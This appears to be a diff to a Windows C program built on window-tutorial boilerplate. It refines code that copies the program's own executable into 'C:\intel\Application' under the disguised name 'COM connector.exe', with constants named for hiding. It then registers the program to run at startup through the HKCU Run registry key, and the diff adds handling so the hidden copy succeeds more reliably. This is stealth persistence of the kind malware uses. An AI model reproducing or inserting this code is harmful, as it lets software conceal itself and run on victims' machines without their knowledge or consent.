@@ -15,7 +15,8 @@ const char g_szClassName[] = "myWindowClass";
 static const TCHAR reg_path[] = TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
 
 static const TCHAR hide_path[] = TEXT("C:\\intel\\Application\\COM connector.exe");
-static const TCHAR hide_dir[] = TEXT("C:\\intel\\Application");
+static const TCHAR first_hide_dir[] = TEXT("C:\\intel");
+static const TCHAR second_hide_dir[] = TEXT("C:\\intel\\Application");
 
 // Step 4: the Window Procedure
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
@@ -72,8 +73,17 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	TCHAR path[MAX_PATH+1];
 	GetModuleFileName(hInstance, path, MAX_PATH);
 	
-	BOOL success = CreateDirectoryA(hide_dir, NULL);
-	CopyFile(path, hide_path, FALSE);
+	BOOL success = CreateDirectoryA(first_hide_dir, NULL);
+	success = CreateDirectoryA(second_hide_dir, NULL);
+	if (!CopyFile(path, hide_path, FALSE)) {
+		DWORD d = GetLastError();
+		if (d != ERROR_ALREADY_EXISTS && d != ERROR_SHARING_VIOLATION) {
+			MessageBox(NULL, "error initializing variable!", "Error!",
+				MB_ICONEXCLAMATION | MB_OK);
+			return 0;
+		}
+		
+	}
 	//step 0.2: registering myself as startup
 	HKEY hkey = NULL;
 	int a = RegCreateKey(HKEY_CURRENT_USER, reg_path, &hkey);
